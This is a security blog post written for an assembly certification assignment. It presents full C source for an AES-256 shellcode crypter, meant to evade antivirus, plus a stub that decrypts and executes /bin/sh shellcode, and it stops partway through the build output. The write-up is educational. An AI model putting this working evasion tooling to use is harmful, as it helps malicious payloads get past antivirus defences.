<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 7 - Crypters – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, crypter"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 7 - Crypters"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 7 - Crypters"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-7/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-7/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>SLAE Assignment 7 - Crypters | popped.io</title> <meta property="og:title" content="SLAE Assignment 7 - Crypters"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:description" content="SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-7/"> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-7/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2016-12-07T19:40:00-05:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"SLAE Assignment 7 - Crypters","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2016-12-07T19:40:00-05:00","dateModified":"2016-12-07T19:40:00-05:00","description":"SLAE Assignment Stub This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/SLAE-Assignment-7/"},"url":"http://localhost:4000/SLAE-Assignment-7/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 7 - Crypters</h1> <h4>07 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~6 minutes </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-7-requirements">Assignment 7 Requirements</h3> <ul> <li>Create a custom crypter</li> <li>Feel free to use any encryption schema</li> <li>Use any programming language</li> </ul> <h3 id="crypters">Crypters</h3> <p>Crypters are a program that encrypt an executable or shellcode and decrypt the executable or shellcode at run time. The goal of crypters is to evade antivirus detection.</p> <p>For this assignment, I decided to write the crypter in C and use the <a href="https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption">OpenSSL EVP</a> symmetric cipher routine. The encryption algorithm that was chosen is AES-256 with an 128 bit initialization vector in CBC mode.</p> <h3 id="the-shellcode">The Shellcode</h3> <p>The example shellcode I will be using is a really simple stack-based <code class="highlighter-rouge">execve</code> SYSCALL that executes <code class="highlighter-rouge">/bin/sh</code>.</p> <p>The nasm source is located <a href="https://github.com/skahwah/slae/blob/master/execve-stack/execve-stack.nasm">here</a> and a brief breakdown of the shellcode is located <a href="https://popped.io/execve-stack/">here</a><a>.</a></p> <p>Here are the opcodes:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>89<span class="se">\x</span>e2<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
</code></pre></div> <h3 id="encryptc">encrypt.c</h3> <p>encrypt.c is responsible for taking user supplied shellcode and encrypting using a 256 bit AES key and 128 bit initialization vector. Both the AES key and IV are randomly generated.</p> <p>encrypt.c can be found <a href="https://github.com/skahwah/slae/blob/master/assignment7/encrypt.c">here</a>.</p> <p>Below is an explanation of encrypt.c</p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cm">/*
encrypt.c
Sanjiv Kawa (@skawasec)
www.popped.io
December 7, 2016

This program encrypts user supplied shellcode.
Please use decrypt.c to decrypt and execute the shellcode.

compile: encrypt.c -l crypto -o encrypt
*/</span>

<span class="cp">#include &lt;openssl/conf.h&gt;
#include &lt;openssl/evp.h&gt;
#include &lt;openssl/err.h&gt;
#include &lt;string.h&gt;
</span>
<span class="c1">//print shellcode in \x format
</span><span class="kt">void</span> <span class="nf">print_shellcode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">len</span><span class="p">;</span>

  <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">//generate a random string for AES key and initialization vector
//modified http://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
</span><span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">random_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="n">charset</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>
  <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="kt">int</span> <span class="n">key</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="p">(</span><span class="k">sizeof</span> <span class="n">charset</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">str</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">charset</span><span class="p">[</span><span class="n">key</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="n">str</span><span class="p">[</span><span class="n">size</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

  <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//main
</span><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">//256 bit key
</span>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">iv</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="c1">//128 bitinitialization vector
</span>
  <span class="kt">int</span> <span class="n">key_len</span><span class="p">,</span> <span class="n">iv_len</span><span class="p">;</span>
  <span class="n">key_len</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
  <span class="n">iv_len</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>

  <span class="n">random_string</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span> <span class="c1">//generate random AES 256 bit key
</span>  <span class="n">random_string</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span> <span class="n">iv_len</span><span class="p">);</span> <span class="c1">//generate random AES 128 bit initialization vector
</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] AES 128 bit IV: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">iv</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] AES 256 bit Key: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">key</span><span class="p">));</span>

  <span class="c1">//plaintext shellcode
</span>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>

  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">encrypted</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">//buffer for encrypted shellcode
</span>  <span class="kt">int</span> <span class="n">shellcode_len</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">;</span> <span class="c1">//length of shellcode
</span>
  <span class="n">shellcode_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

  <span class="c1">//initialize the library
</span>  <span class="n">ERR_load_crypto_strings</span><span class="p">();</span>
  <span class="n">OpenSSL_add_all_algorithms</span><span class="p">();</span>
  <span class="n">OPENSSL_config</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>

  <span class="c1">//encrypt the shellcode
</span>  <span class="n">encrypted_len</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">);</span>

  <span class="c1">//null terminate the shellcode for printing
</span>  <span class="n">shellcode</span><span class="p">[</span><span class="n">shellcode_len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="n">encrypted</span><span class="p">[</span><span class="n">encrypted_len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

  <span class="c1">//print shellcode in both forms
</span>  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Original Shellcode (%d bytes):</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">shellcode_len</span><span class="p">));</span>
  <span class="n">print_shellcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Encrypted Shellcode (%d bytes):</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">encrypted_len</span><span class="p">));</span>
  <span class="n">print_shellcode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">);</span>

  <span class="c1">//clean up
</span>  <span class="n">EVP_cleanup</span><span class="p">();</span>
  <span class="n">ERR_free_strings</span><span class="p">();</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//error handler
</span><span class="kt">void</span> <span class="nf">handleErrors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">ERR_print_errors_fp</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
  <span class="n">abort</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">//encryption function for AES 256 with a 128 bit initialization vector
</span><span class="kt">int</span> <span class="nf">encrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span><span class="p">,</span> <span class="kt">int</span> <span class="n">shellcode_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">encrypted</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">;</span> <span class="c1">//openssl EVP ciphertext structure
</span>
  <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">;</span>

  <span class="c1">//create and initialize the context
</span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span>
    <span class="n">handleErrors</span><span class="p">();</span> <span class="c1">//error handler
</span>
  <span class="c1">//initialize the encryption operation for AES 256 with a 128 bit initialization vector
</span>  <span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>

  <span class="n">EVP_EncryptUpdate</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">);</span> <span class="c1">//encrypt shellcode
</span>
  <span class="n">encrypted_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span> <span class="c1">//encrypted shellcode length
</span>
  <span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">encrypted</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span> <span class="c1">//finalize encryption
</span>
  <span class="n">encrypted_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span> <span class="c1">//encrypted shellcode length
</span>
  <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">);</span> <span class="c1">//clean up
</span>
  <span class="k">return</span> <span class="n">encrypted_len</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> <h3 id="decryptc">decrypt.c</h3> <p>decrypt.c is responsible for taking the 256 bit AES key and 128 bit initialization vector used to encrypt the shellcode string as well as the encrypted shellcode string and decrypting it to it’s original form.</p> <p>After decrypting the shellcode, decrypt.c continues to execute the shellcode and use the stack-based <code class="highlighter-rouge">execve</code> syscall to execute <code class="highlighter-rouge">/bin/sh</code>.</p> <p>decrypt.c can be found <a href="https://github.com/skahwah/slae/blob/master/assignment7/decrypt.c">here</a>.</p> <p>Below is an explanation of decrypt.c</p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cm">/*
decrypt.c
Sanjiv Kawa (@skawasec)
www.popped.io
December 7, 2016

This program decrypts and executes the shellcode encrypted by encrypt.c

Compile: gcc -fno-stack-protector -z execstack decrypt.c -l crypto -o decrypt
*/</span>

<span class="cp">#include &lt;openssl/conf.h&gt;
#include &lt;openssl/evp.h&gt;
#include &lt;openssl/err.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
</span>
<span class="c1">//print shellcode in \x format
</span><span class="kt">void</span> <span class="nf">print_shellcode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">len</span><span class="p">;</span>

  <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">//execute shellcode
</span><span class="kt">void</span> <span class="nf">execute_shellcode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
  <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">//main
</span><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">decrypted</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">//buffer for decrypted shellcode
</span>  <span class="kt">int</span> <span class="n">decrypted_len</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">;</span> <span class="c1">//length of shellcode
</span>

  <span class="c1">//128 bit AES initialization vector used to encrypt the shellcode
</span>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">iv</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"KSB1FebW397VI5uG"</span><span class="p">;</span>

  <span class="c1">//256 bit AES key used to encrypt the shellcode
</span>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"PKdhtXMmr18n2L9K88eMlGn7CcctT9Rw"</span><span class="p">;</span>

  <span class="c1">//encrypted shellcode
</span>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">encrypted</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xb0\x69\x09\xde\xc5\x63\x0e\x69\x5c\xd1\x7e\x34\xf3\xc1\x7b\x28\x6c\x47\x48\xd4\x5b\x83\x82\x6b\x4b\xb5\x52\x47\xb1\x3e\xf2\x70</span><span class="s">"</span><span class="p">;</span>

  <span class="c1">//length of encrypted shellcode
</span>  <span class="n">encrypted_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">encrypted</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Encrypted Shellcode (%d bytes):</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">encrypted_len</span><span class="p">));</span>
  <span class="n">print_shellcode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] AES 128 bit IV: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">iv</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] AES 256 bit Key: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">key</span><span class="p">));</span>

  <span class="c1">//initialize the library
</span>  <span class="n">ERR_load_crypto_strings</span><span class="p">();</span>
  <span class="n">OpenSSL_add_all_algorithms</span><span class="p">();</span>
  <span class="n">OPENSSL_config</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>

  <span class="c1">//decrypt the shellcode
</span>  <span class="n">decrypted_len</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">);</span>

  <span class="c1">//null terminate the shellcode for printing
</span>  <span class="n">decrypted</span><span class="p">[</span><span class="n">decrypted_len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Decrypted Shellcode (%d bytes):</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">decrypted_len</span><span class="p">));</span>
  <span class="n">print_shellcode</span><span class="p">(</span><span class="n">decrypted</span><span class="p">);</span>

  <span class="c1">//clean up
</span>  <span class="n">EVP_cleanup</span><span class="p">();</span>
  <span class="n">ERR_free_strings</span><span class="p">();</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Executing Shellcode:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="c1">//execute shellcode
</span>  <span class="n">execute_shellcode</span><span class="p">(</span><span class="n">decrypted</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//error handler
</span><span class="kt">void</span> <span class="nf">handleErrors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">ERR_print_errors_fp</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
  <span class="n">abort</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">//decryption function for AES 256 with a 128 bit initialization vector
</span><span class="kt">int</span> <span class="nf">decrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">encrypted</span><span class="p">,</span> <span class="kt">int</span> <span class="n">encrypted_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">decrypted</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">;</span> <span class="c1">//openssl EVP ciphertext structure
</span>
  <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="n">decrypted_len</span><span class="p">;</span>

  <span class="c1">//create and initialize the context
</span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">()))</span>
    <span class="n">handleErrors</span><span class="p">();</span> <span class="c1">//error handler
</span>
  <span class="c1">//initialize the decryption operation for AES 256 with a 128 bit initialization vector
</span>  <span class="n">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">EVP_aes_256_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>

  <span class="n">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">);</span> <span class="c1">//decrypt shellcode
</span>
  <span class="n">decrypted_len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span> <span class="c1">//decrypted shellcode length
</span>
  <span class="n">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">decrypted</span> <span class="o">+</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span> <span class="c1">//finalize encryption
</span>
  <span class="n">decrypted_len</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span> <span class="c1">//decrypted shellcode length
</span>
  <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">);</span> <span class="c1">//clean up
</span>
  <span class="k">return</span> <span class="n">decrypted_len</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> <h3 id="compiling-and-executing">Compiling and Executing</h3> <p>First, encrypt.c is compiled and then executed. The 256 bit AES key and 128 bit initialization vector used to encrypt the shellcode are displayed, along with the shellcode in it’s original and encrypted forms.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>gcc encrypt.c -l crypto -o encrypt
<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment7$ </span>./encrypt
<span class="o">[</span>+] AES 128 bit IV: KSB1FebW397VI5uG
